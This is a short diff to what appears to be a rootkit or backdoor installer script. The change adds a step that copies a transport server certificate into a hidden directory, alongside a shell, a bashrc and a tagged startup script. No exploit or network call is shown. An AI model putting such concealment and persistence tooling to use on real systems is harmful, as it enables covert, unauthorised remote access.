@@ -26,6 +26,9 @@ cp $PWD/../output/shell /$HIDE/$HIDE"_shell" && \
 # Copy "bashrc"
 cp $PWD/../scripts/bashrc /$HIDE/$HIDE"_rc" && \
 
+# Copy "server-certificate.pem"
+cp $PWD/../userland/transport/server-certificate.pem /$HIDE/$HIDE"_cert.pem"
+
 # Create start script
 cp $PWD/../scripts/start /$HIDE/$HIDE"_start" && \
 sed -i s!XXXXX!$TAG_NAME! /$HIDE/$HIDE"_start" && \
